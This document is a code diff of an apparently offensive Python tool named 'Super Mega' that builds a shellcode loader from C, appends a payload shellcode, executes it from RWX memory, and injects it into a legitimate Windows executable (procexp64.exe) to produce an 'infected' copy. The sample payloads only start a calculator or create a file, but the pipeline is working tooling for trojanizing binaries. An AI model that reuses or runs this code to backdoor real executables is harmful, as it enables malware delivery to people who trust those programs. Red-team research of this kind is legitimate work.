@@ -24,21 +24,26 @@ options_default = {
     "payload": "shellcodes/calc64.bin",
     "verify": False,
 
-    "cleanup_files_on_start": True,
-    "cleanup_files_on_exit": True, # all is just in out/
-
-
-    "generate_asm_from_c": True,
-    "generate_shc_from_asm": True,
-    "test_loader_shellcode": False,
-    "obfuscate_shc_loader": False,
-    "test_obfuscated_shc": False,
-    "exec_final_shellcode": True,
-
+    # configuration
     "alloc_style": AllocStyle.RWX,
     "exec_style": ExecStyle.CALL,
     "copy_style": CopyStyle.SIMPLE,
-    "dataref_style": DataRefStyle.APPEND
+    "dataref_style": DataRefStyle.APPEND,
+
+    "try_start_loader_shellcode": False,  # without payload (Debugging)
+    "try_start_final_shellcode": True,    # with payload (should work)
+
+    # cleanup
+    "cleanup_files_on_start": True,
+    "cleanup_files_on_exit": True,
+
+    # For debugging: Can disable some steps
+    "generate_asm_from_c": True,
+    "generate_shc_from_asm": True,
+
+    # Not working atm
+    "obfuscate_shc_loader": False,
+    "test_obfuscated_shc": False,
 }
 
 
@@ -51,24 +56,32 @@ options_verify = {
     "payload": "shellcodes/createfile.bin",
     "verify": True,
 
-    "cleanup_files_on_start": True,
-    "cleanup_files_on_exit": True, # all is just in out/
+    # configuration
+    "alloc_style": AllocStyle.RWX,
+    "exec_style": ExecStyle.CALL,
+    "copy_style": CopyStyle.SIMPLE,
+    "dataref_style": DataRefStyle.APPEND,
 
-    "generate_asm_from_c": True,
-    "generate_shc_from_asm": True,
-    "test_loader_shellcode": False,
-    "obfuscate_shc_loader": False,
-    "test_obfuscated_shc": False,
-    "exec_final_shellcode": False,
+    # testing
+    "try_start_loader_shellcode": False,  # without payload (Debugging)
+    "try_start_final_shellcode": False,   # with payload (should work)
 
+    # injecting into exe
     "inject_exe": True,
     "inject_exe_in": "exes/procexp64.exe",
     "inject_exe_out": "out/procexp64-a.exe",
 
-    "alloc_style": AllocStyle.RWX,
-    "exec_style": ExecStyle.CALL,
-    "copy_style": CopyStyle.SIMPLE,
-    "dataref_style": DataRefStyle.APPEND
+    # For debugging: Can disable some steps
+    "generate_asm_from_c": True,
+    "generate_shc_from_asm": True,
+    
+    # cleanup
+    "cleanup_files_on_start": True,
+    "cleanup_files_on_exit": True, # all is just in out/
+
+    # doesnt work
+    "obfuscate_shc_loader": False,
+    "test_obfuscated_shc": False,
 }
 
 
@@ -81,6 +94,19 @@ main_exe_file = os.path.join(build_dir, "main.exe")
 main_shc_file = os.path.join(build_dir, "main.bin")
 
 
+debug_data = {
+    "loader_shellcode": b"",
+    "payload_shellcode": b"",
+    "final_shellcode": b"",
+
+    "asm_initial": "",
+    "asm_cleanup": "",
+    "asm_fixup": "",
+
+    "original_exe": b"",
+    "infected_exe": b"",
+}
+
 
 def main():
     print("Super Mega")
@@ -88,17 +114,25 @@ def main():
     if options["cleanup_files_on_start"]:
         clean_files()
 
+    shutil.copy("source/main.c", "build/main.c")
+    shutil.copy("source/peb_lookup.h", "build/peb_lookup.h")
+
     if options["generate_asm_from_c"]:
         with open(options["payload"], 'rb') as input2:
             data_payload = input2.read()
             l = len(data_payload)
-        make_c_to_asm(main_c_file, main_asm_file, l)
+            debug_data["payload_shellcode"] = data_payload
+        asm = make_c_to_asm(main_c_file, main_asm_file, l)
+        debug_data["asm_initial"] = asm["initial"]
+        debug_data["asm_cleanup"] = asm["cleanup"]
+        debug_data["asm_fixup"] = asm["fixup"]
 
     if options["generate_asm_from_c"]:
-        make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
+        code = make_shc_from_asm(main_asm_file, main_exe_file, main_shc_file)
+        debug_data["loader_shellcode"] = code
     
-    if options["test_loader_shellcode"]:
-        test_shellcode(main_shc_file)
+    if options["try_start_loader_shellcode"]:
+        try_start_shellcode(main_shc_file)
 
     # SGN seems buggy atm
     #if options["obfuscate_shc_loader"]:
@@ -109,41 +143,55 @@ def main():
     #            return
 
     if options["dataref_style"] == DataRefStyle.APPEND:
+        print("--[ Merge stager: {} + {} -> {} ] ".format(main_shc_file, options["payload"], main_shc_file))
         with open(main_shc_file, 'rb') as input1:
             data_stager = input1.read()
 
         with open(options["payload"], 'rb') as input2:
             data_payload = input2.read()
 
-        print("--[ Integrate Stager: {}  Payload: {}  (sum: {})]".format(
+        print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
             len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))
 
         with open(main_shc_file, 'wb') as output:
-            output.write(data_stager)
-            output.write(data_payload)
-
-        print("---[ Final shellcode available at: {} ]".format(main_shc_file))
+            data = data_stager + data_payload
+            output.write(data)
+            debug_data["final_shellcode"] = data
 
         if options["verify"]:
             print("--[ Verify final shellcode ]")
             if not verify_shellcode(main_shc_file):
                 return
 
-        if options["exec_final_shellcode"]:
+        if options["try_start_final_shellcode"]:
             print("--[ Test Append shellcode ]")
-            test_shellcode(main_shc_file)
+            try_start_shellcode(main_shc_file)
 
         # copy it to out
-        #shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_bin_clean_append_file)))
+        shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))
 
     if options["inject_exe"]:
+        debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])
+
         inject_exe(main_shc_file, options["inject_exe_in"], options["inject_exe_out"])
         if options["verify"]:
             print("--[ Verify final exe ]")
-            verify_injected_exe(options["inject_exe_out"])
+            if verify_injected_exe(options["inject_exe_out"]):
+                debug_data["infected_exe"] = file_readall_binary(options["inject_exe_out"])
 
     if options["cleanup_files_on_exit"]:
         clean_files()
+
+    print("{} {} {} - {} {} {} - {} {}".format(
+        len(debug_data["loader_shellcode"]),
+        len(debug_data["payload_shellcode"]),
+        len(debug_data["final_shellcode"]),
+        len(debug_data["asm_initial"]),
+        len(debug_data["asm_cleanup"]),
+        len(debug_data["asm_fixup"]),
+        len(debug_data["original_exe"]),
+        len(debug_data["infected_exe"]),
+    ))
 
 if __name__ == "__main__":
     main()
